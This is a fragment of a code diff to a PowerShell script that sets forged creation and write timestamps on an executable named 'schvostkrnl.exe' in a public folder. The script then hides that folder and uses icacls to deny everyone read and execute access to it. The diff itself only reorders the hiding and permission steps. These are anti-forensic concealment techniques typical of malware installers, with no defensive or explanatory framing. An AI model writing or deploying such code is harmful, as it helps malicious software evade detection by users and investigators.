@@ -15,6 +15,6 @@ Set-ItemProperty -Path "C:\Users\Public\krnl\schvostkrnl.exe" -Name LastWriteTim
 
 Set-ItemProperty -Path "C:\Users\Public\krnl\schvostkrnl.exe" -Name CreationTime -Value (Get-Date "2024-12-13 14:24:57")
 
-Start-Process -NoNewWindow -FilePath "icacls" -ArgumentList "`"C:\Users\Public\krnl`" /deny Everyone:(RX)" -Wait
-
 Set-ItemProperty -Path "C:\Users\Public\krnl" -Name Attributes -Value Hidden
+
+Start-Process -NoNewWindow -FilePath "icacls" -ArgumentList "`"C:\Users\Public\krnl`" /deny Everyone:(RX)" -Wait
